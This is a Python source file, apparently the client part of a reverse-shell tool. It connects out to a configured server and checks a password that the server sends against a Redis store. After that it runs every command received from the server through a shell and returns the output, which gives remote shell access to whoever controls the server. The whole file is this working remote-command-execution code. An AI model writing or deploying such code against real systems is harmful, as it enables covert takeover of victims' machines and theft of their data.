import socket
import sys
import subprocess
from pyfiglet import Figlet

from lib.endpoint import EndPoint


class Client(EndPoint):
    def __init__(self):
        super().__init__()
        self.logged_in = False  # Should be false during production
        self.user = dict(
            user_id="",
            user_name="",
            user_password=""
        )

        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # reverse_shell starting application
        app_name, app_version = self.app_conf['APP_NAME'], self.app_conf['VERSION']
        print(f"[*] Starting {app_name} -version:{app_version} -address: {self.HOST}:{self.PORT}")
        f = Figlet(font='larry3d')
        print(f"{self.colors_PRIMARY}")
        print(f.renderText("c l i e n t"))
        print(f"{self.colors_RESET}")

    def execCommandOnShell(self, cmd_command: str):
        if cmd_command.lower() == "exit":
            self.closeConnection(self.client_socket, self.HOST, self.PORT)
            sys.exit()

        print(f"[*] Executing command on command Prompt")
        result = subprocess.run(cmd_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, timeout=5)

        status = "Success" if result.returncode == 0 else "Failed"
        exec_message = \
            f"""
            {self.user['user_name']} run command: '{result.args}' on shell.
            return_code: {result.returncode} - {status}
        """
        self.logger.info(exec_message)
        completed_process = dict(
            args=result.args,
            return_code=result.returncode,
            stdout=result.stdout,
            stderr=result.stderr
        )
        return completed_process

    def makeConnection(self):
        try:
            message = f"Client successfully connected to {self.HOST}:{self.PORT}"
            self.client_socket.connect((self.HOST, self.PORT))

            self.logger.info(message)
            print(f"[+] {message}\n")

        except ConnectionRefusedError as error:
            print(f"[-] Error : {error}")
            sys.exit()

    def authServerConnection(self):
        if not self.logged_in:
            print(f"[-] Unidentified user @ {self.HOST}:{self.PORT}! Initiating authentication procedure...")

            login_msg = dict(
                login_error= "Unidentified user! Please login to continue"
            )
            self.sendMsg(self.client_socket, login_msg)

        while not self.logged_in:
            auth_credentials: dict = self.receiveMsg(self.client_socket)
            user_logged_in = self.loginUser(auth_credentials)
            if user_logged_in:
                self.logged_in = True
                break

    def loginUser(self, user):
        user_id: str = user['user_id']
        user_name: str = user['user_name']
        user_passwd: str = user['user_password']
        user_password: bytes = user_passwd.encode("UTF-8")

        db_user: dict = self.redis_db.selectExistingUser(user_name)

        if db_user:
            if db_user['user_password'] == user_passwd:
                self.user = db_user
                AES_KEY, AES_IV = self.initAESEncryption(key=user_password)
                self.sendMsg(self.client_socket, dict({
                    'AES_IV': AES_IV,
                    'login_success': f"You are now logged in as '{user_name}'"
                }))
                self.AES_KEY, self.AES_IV = AES_KEY, AES_IV
                return True
            else:
                self.sendMsg(self.client_socket, dict({
                    'login_error': f"Invalid password for account '{user_name}'"
                }))
                return False
        else:
            self.sendMsg(self.client_socket, dict({
                'login_error': f"User '{user_name}' not found"
            }))
            return False


def Main():
    client = Client()
    client.makeConnection()
    client.authServerConnection()

    while True:
        try:
            received_data: dict = client.receiveMsg(client.client_socket)

            if 'command' in received_data.keys():
                command = received_data['command']
                completed_process: dict = client.execCommandOnShell(command)
                client.sendMsg(client.client_socket, completed_process)

        except Exception as error:
            print(f"[-] Error : {error}")
            client.closeConnection(socket=client.client_socket, HOST=client.HOST, PORT=client.PORT)
            sys.exit()


if __name__ == "__main__":
    Main()
